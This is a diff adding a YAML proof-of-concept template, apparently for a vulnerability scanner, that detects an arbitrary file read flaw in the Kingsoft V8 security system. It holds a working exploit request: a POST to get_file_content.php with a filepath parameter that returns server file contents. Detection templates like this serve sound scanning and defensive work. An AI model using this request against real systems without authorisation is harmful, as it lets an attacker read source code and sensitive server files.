@@ -1,0 +1,21 @@
+id: poc-yaml-kingsoft-v8-arbitrary-file-read
+info:
+  name: Kingsoft V8安全系统任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: Kingsoft
+  osprey-id: vb_2021_0056
+requests:
+- method: POST
+  path: /receive_file/get_file_content.php
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101
+      Firefox/86.0
+    Content-Type: application/x-www-form-urlencoded
+  data: filepath=login.php
+  expression: 'status_code == 200 && contains(body, "require_once(\"language/zh_CN/login_resource.php\")")
+
+    '
+variables: {}
+transport: http
